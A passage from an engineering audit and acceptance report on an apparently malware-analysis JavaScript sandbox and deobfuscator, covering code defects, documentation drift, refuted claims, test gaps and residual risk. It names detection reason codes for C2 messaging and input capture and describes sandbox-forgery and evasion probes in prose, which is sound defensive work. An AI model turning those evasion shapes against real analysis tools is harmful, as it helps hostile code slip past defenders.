  eight passes copy `createReporter`. `platform-kit.js` has no `method()`
  helper, so eight env modules redeclare it. The dead-code bug is the drift
  those copies produced.
- **Facades.** `tools/engine/index.js` has zero importers; `sandbox.js`,
  `clock.js`, `invoke.js` deep-import `engine/runtime.js|limits.js`. Four
  facades are bypassed ~12 times. Nothing pins the import graph, so one added
  import can close a real cycle that ESM resolves as `undefined`.
- **Report/schema.** Five reason codes emitted by `scoreVerdict`
  (`DYNAMIC_ENV_TAMPER`, `DYNAMIC_MESSENGER_C2`, `DYNAMIC_WORKER_OFFLOAD`,
  `DYNAMIC_OFFLINE_PERSISTENCE`, `DYNAMIC_INPUT_CAPTURE`, up to 27 points) are
  absent from `REPORT-SCHEMA.md`. `maxSourceBytes` is documented as 1 MiB and
  enforced at 8 MiB (`limits.js:27`). `hooks.errorsTruncated` never receives the
  bus flag. `sample.size` is UTF-16 units while the doc says bytes.
  `exceptions.promiseJobs` is structurally always `0`.
- **Types.** `scopeLogger` is declared as `Logger` but has no `fatal`/`level`
  (verified); root `run({ sandbox })` and
  `run({ instrumentation })` are honoured but undeclared;
  `normalizeLimits` is declared with one parameter while the documented lenient
  path passes two; `api.install(targets)` is typed `string[]` but reads
  `{expression, keys}`; `destination` accepts an fd the type rejects and uses
  the `NodeJS` namespace while `@types/node` is a devDependency.
- **Engine.** `sandbox/clock.js:190` uses the loose `isHostStackExhaustion`
  where the engine keeps `isCallbackStackExhaustion` private for the same
  callback boundary (not reachable today). `poison()` is dead.
  `createRuntime` failures do not quarantine the module.
- **Restore.** `control-flow.js:257-282` evaluates the order literal at restore
  time with no `String.prototype.split` tamper check; `dead-code` lacks the
  `with` guard the other passes have; `rename.js:165-178` misses an enclosing
  `with`; `valueToNode(-0)` loses the sign (unreachable today).
- **Hooks.** `exception-hook.js` silently stops observing after 1,000
  exceptions with no counter/event; `astHookStats` is computed and discarded;
  an undeclared footprint is reported as fully traceless; `registerHooks`
  returns `'anonymous'` instead of the assigned id.
- **Tests.** `tests/alignment-coverage.test.js:14` mutates the shared QuickJS
  module (poisons the process-global singleton); `tests/env-misc.test.js`
  accumulates trace events across 19 tests; two product-gate assertions are
  vacuous (`iocs >= 0`, `techniques >= 0`); `restore-pipeline.test.js` evaluates
  restored output with host `new Function`; `HandleBag.size` is declared and
  does not exist.
- **Style/nits.** Mis-indented `instrumentation/index.js:143-163`; an orphaned
  JSDoc above `inPrologueSlot`; `eslint-disable` comments in a repo with no
  linter; `withHandles`/`disposeAll` unused; `invocation` counter write-only;
  `misc.js:…` slices to 1024 over a 512-char preview.

## 7. Disposition of the previous wave

The `ASSESSMENT.md` CRITICAL/HIGH items were re-checked at HEAD; this is the
acceptance of the alignment wave, not a re-litigation.

| Prior item | State at `f0255dc` | Evidence |
| --- | --- | --- |
| C1 `applyInsertions` O(k·n) | **Fixed** | `code.js:559-580` sorts once then emits a parts array + one `join`; `jsvmp.js:272-286` same. No per-insertion copy remains. |
| C2 red gate (6 example failures) | **Fixed** | 34/34 example tests pass; `products`/`suite` margins 0–13, median +2. |
| H1 undefined binding at non-default levels | **Fixed** | `Program` binding requires `rank ≥ function` (`code.js:302-312`) and every probe site agrees; `level:'off'` returns the input by identity. |
| H2 microtasks not drained between same-batch timers | **Fixed** | `clock.js` runs one callback per `runDue` turn and `settle` drains jobs between turns (`invoke.js:467-517`); per-batch `batchErrors` exists. |
| H3 getter read on caught errors | **Fixed** | `summarizeArgument` reports non-engine objects by type only and gates engine errors through a prototype probe (`code.js:398-440`); residual own-accessor-on-engine-error is documented. |
| H4 sandbox ↔ invocation cycle | **Partially fixed** | No module cycle exists (13 cross-directory edges, none closing). `engine/` now owns `limits`/`runtime`, but `engine/index.js` is a phantom facade and `clock.js` still carries a second stack classifier (H10/M3). |
| H5 crypto determinism untested | **Still open, worse** | Same-seed determinism holds ([A] two processes identical), but view-window and NUL defects (P0-9) are now proven and one test pins a wrong `encodeInto` result. |
| M1 host callback byte caps | **Partly fixed** | Console has count+chars; canvas element listeners still have no owner (P0-3); `matchMedia`/`getSelection` still retain per-call handles. |
| M2 `builder.run()` host execution | **Still open** | `jsvmp/builder.js:438-449` still executes via `new Function`; exported at the root. |
| M3 hot paths | **Partly fixed** | Insertion and trace ring are fixed; `generateExpression` still generates before deciding foldability; IOC scanning is superlinear (see §3). |
| M6 half-rewritten AST after a pass crash | **Still open** | `pass-context.js:63-76` swallows pass errors; `dead-code` demonstrates it live (P0-8). |

## 8. Documentation drift ledger

Current-contract documents (must match HEAD):

| Claim | Doc | Code | Status |
| --- | --- | --- | --- |
| "z3-solver removed from package.json and lockfile; `grep -c` → 0" | `VERIFICATION.md:29-34` | 3 lockfile entries, `package.json:110` | **drifted** (also an unused dependency) |
| `maxSourceBytes` = 1 MiB | `CONTRACTS.md:279` | 8 MiB (`limits.js:27`) | **drifted** |
| Report keeps the **newest** 50 hook failures | `REPORT-SCHEMA.md:144-146`, `README.md:345` | `slice(0,50)` keeps the oldest (`report.js:1163`) | **drifted** |
| Every verdict point is attributable to a listed reason code | `REPORT-SCHEMA.md:54-85` | 5 undocumented codes, up to 27 points | **drifted** |
| `trace.child(kind).child(sub)` namespaces as `kind.sub` | `CONTRACTS.md:76` | chained emit throws `unknown trace kind` | **drifted** |
| `navigator.userAgent` etc. are accessors; interface constructors exist | `RESEARCH-ANTI-ANALYSIS.md:53`, `env/navigator.js:7-9` | data properties; `typeof Navigator === 'undefined'` | **drifted** |
| `--passes/--exclude/--rounds` are restore-specific | `README.md:312` | shared strict parser accepts them for `analyze` | **drifted** |
| 612 tests / 42 files, 114-file tarball | `VERIFICATION.md:8-24,88-150` | 883 tests / 55 files / 118-file tarball | **historical, correctly pinned to `7c1df9c`** — not drift, but no current row exists at HEAD |
| 14 trace kinds, 13 phases, 21 hook phases, 28 env modules, 68 barrel exports, disposal shape, CLI defaults, `DEFAULT_LIMITS` | `CONTRACTS.md` | all match | **accurate** |

## 9. Claims that did **not** survive verification

Evidence discipline cuts both ways. Three reviewer claims were refuted at HEAD:

1. **"`level:'off'` still instruments a detected JSVMP and advances the clock."**
   `instrumentation/index.js:124` gates the JSVMP branch on
   `config.jsvmp !== false`, but it then requires
   `codeInstrumenter.channelExpression()`, which is `null` when the level rank is
   0. Probe: `examples/jsvmp-sample.js` at `level:'off'` → `virtualMs: 0`, zero
   `code` step events (only the `instrumented` marker). **Invalid at HEAD.**
2. **"A nested-array source is certified as guest stack evidence by the host Babel
   parser."** Refuted: the same 5 000-deep array literal with *all* instrumentation
   disabled still reports `limitsHit: ["stack"]`, i.e. the overflow is the guest
   evaluator's (correctly classified). Babel `parse()` on that input raises
   `ParseError`, not `RangeError`. The reachable host-stack defect is H17 (chained
   members in `analyzeSource`/`generate`), not a forged guest verdict.
3. **"The pinned `612/42` figures are documentation drift."** They are explicitly
   attributed to commit `7c1df9c` in `VERIFICATION.md:8-24`; a frozen baseline is
   allowed to stay frozen. The defect is the missing current row, not the old one.

## 10. Why the green suite missed all of this

This section describes the 883-test suite at `f0255dc`. Those shapes are now
hard asserts in `tests/acceptance-p0.test.js` (§11).

The 883-test suite is genuinely good at what it asserts (evaluated-value restore
equivalence, real escape negative tests, disposal failure evidence). The P0s sit
in shapes no test constructs:

1. An event listener that is never removed (`canvas.js`) — no test attaches one.
2. `throw a, b` / `if (0n)` / `window._0xa` — the corpus never uses those forms.
3. A budget small enough to split a pair — `maxInsertions` is never lowered.
4. A sample long enough to exceed the 5 000-event report slice — fixtures are
   short.
5. `Object.assign` on `document` — the traceless tests probe
   `getOwnPropertySymbols`, which is exactly what the filter patches.
6. `AbortController.abort({name, message})` — no test forges the shape.
7. `crypto.subtle.digest` on a *view* and NUL strings — tests use whole buffers
   and ASCII.
8. `new Image().src` — the beacon is only covered as an API reachability event.

A regression test per row is the minimum bar for calling this gate green; the
probes in `tests/fixtures/acceptance/` are written to be lifted into
`tests/*.test.js` unchanged.

## 11. Acceptance decision

**Decision: ACCEPT-WITH-CONDITIONS on the working tree (2026-10-21).** The
REJECT at `f0255dc` stands as the audit of that commit. The P0 bar it set is
now a test gate.

Evidence for this flip, and only this evidence:

- `pnpm test` (`node --test --test-concurrency=1 tests/*.test.js`) — 907 pass /
  0 fail / ~106 s, Node.js v24.19.0.
- `pnpm test:types` (`tsc --project tests/fixtures/types/tsconfig.json`) — exit 0.
- `tests/acceptance-p0.test.js` — 17/17. That file is the twelve P0 rows plus
  H9 (three asserts) and H21.
- CLI `analyze` / `restore` / `run` user paths and the isolation probes were
  reported passing with that suite. This section does not re-paste their stdout.

Coverage was not re-measured. The percentages in §1 and in `VERIFICATION.md`
stay the older pins.

### Closed since the REJECT

| ID | Evidence |
| --- | --- |
| P0-1–P0-12 | `tests/acceptance-p0.test.js`. P0-1 is two asserts (Proxy `Object.assign` steals no symbol; a stolen channel injects no `code:step`). P0-12 asserts `run.provisional === true` and `limitsHit` contains `timeout`. |
| H9 | Same file: a `code:*` pipeline transform runs once; a throwing logger does not escape `dispatch`; `trace.child('hook').child('net')` emits. `tools/hook/hookbus.js` also removes a `once` registration when its handler throws. `tests/hook.test.js` asserts once-removal next to a throwing sibling; it does not itself throw from the `once` handler. |
| H10 | `maxStageDepth` is gone from `DEFAULT_LIMITS`. `interruptQuantumMs` is passed as `resolutionMs` in `tools/sandbox/sandbox.js`. There is no test named H10; `tests/env-time.test.js` only comments on the quantum. |
| H12 | `tests/cli.test.js`: no command exits 2; `--events` is rejected off `run`; `analyze` exits 1 when the guest throws. `seedOption` in `tools/cli.js` parses `0x5eed` to a number, so it matches the numeric default. The test accepts the hex form; it does not compare profiles. |
| H13 | `z3-solver` is absent from `package.json` and `pnpm-lock.yaml`. No dedicated test. |
| H21 | `tests/acceptance-p0.test.js`: `planSize` and `insertions` stay within `maxInsertions`. |

The table the REJECT required is the same bar. Each P0 row and H21 now has the
regression in `tests/acceptance-p0.test.js`. P0-12's landed assert is the
provisional marker, not a fresh cold-versus-warm score comparison.

| # | Fix | Closes | Regression now in `tests/acceptance-p0.test.js` |
| --- | --- | --- | --- |
| 1 | Non-enumerable channel symbol | P0-1 | `Object.assign` Proxy oracle yields no symbol; forged `code:step` absent |
| 2 | Tag converted guest errors; exact-match only host throws | P0-2 | forged abort object → no `limitsHit`, no quarantine |
| 3 | Retain/release element listener handles | P0-3 | `new Image().addEventListener('load')` → `disposal.ok:true` |
| 4 | Atomic insertion units + parse validation | P0-5 | `maxInsertions` sweep never yields `SyntaxError` |
| 5 | Parenthesise or skip sequence arguments | P0-4 | `throw a,b` yields the same caught value at every level |
| 6 | Score from guest-filtered counters; flag truncation | P0-6 | `keepTrace` changes no score |
| 7 | Dynamic-access bail-out in `string-array` | P0-7 | `window._0xa` reference keeps the array |
| 8 | Bigint truthiness + real `isPrologueEntry`; fail on pass error | P0-8 | `if (0n)` keeps the else arm |
| 9 | Byte-window, code-unit and `byteLength` handling | P0-9 | NIST subarray digest, NUL round-trip, `DataView` RNG |
| 10 | Route `img.src` through the network service | P0-10 | beacon emits `net` + `ioc` |
| 11 | Bound `EMAIL_RE` and drop the per-match prefix slice | P0-11 | hostile email-shaped input finishes in bounded time |
| 12 | Host clock sets `provisional` | P0-12 | host-wall timeout marks the run provisional |
| 13 | Gate plan retention by the insertion budget | H21 | plan size stays within `maxInsertions` |

### Known limits (conditions)

- **H1–H4** (interface constructors, event propagation, canvas pixels,
  `location` setters) were not re-probed item by item. They remain open fidelity
  limits. Acceptance does not claim browser parity on those surfaces.
- **P0-12 cold/warm score identity** was the REJECT's wording of the regression.
  The landed test checks the provisional marker. A second process pair that
  scores the same sample cold and warm was not run for this flip.
- **Other §5 rows** (H5–H8, H11, H14–H20, H22–H25) were not re-audited. H12 and
  H13 from the old "ship with the P0s" note are closed; H1–H4, H5, H7 and H8
  are not claimed closed.
- **§1 gates 2 and 4–13** were not re-run. Gate 2 (coverage) in particular is
  not a current result.

## 12. Residual risk and what was not verified

P0-1–P0-12 are closed (§11). The list below is what the `f0255dc` audit did not
verify, plus the conditions in §11. It is not a second open-P0 list.

- **No host escape was found.** Guest↔host object separation, the absence of a
  socket/fs path, default network deny, memory/stack limits and per-run
  runtime/context isolation all held under adversarial probes. At `f0255dc` the
  P0-2 forgery corrupted *classification*, not the memory boundary; that
  forgery is closed (§11).
- **Coverage is host-line coverage.** The large `dom.js`/`canvas.js`/`intl.js`
  template literals are guest source; the 26 % `dom.js` figure is a false signal
  (the uncovered span is the injected shim body). Their guest-visible behaviour
  is only as tested as the oracles above.
- **Not verified:** Windows/macOS/Linux profile matrices, real-browser parity for
  `encodeInto`/`tagLength`/ECB absence, weak-reference/GC-dependent handle
  lifetimes, cross-machine SDK bundle reproducibility, whether forged `code:step`
  events propagate into report scores (injection is proven, propagation is not),
  exact peak RSS for the 70 MB plan cliff under a full run, and the IOC curve at
  the 5 MiB cap (extrapolated from 200 KB; the 2 MB point was killed at 240 s).
  Cross-host tz/ICU divergence (H25) needs a second ICU build to test.
- **Probe provenance.** `tests/fixtures/acceptance/` is committed evidence, not a
  test gate. It must be run with `node`, not `pnpm test`, and
  `disposal-leak.mjs` intentionally prints one engine `Aborted(…)` line.
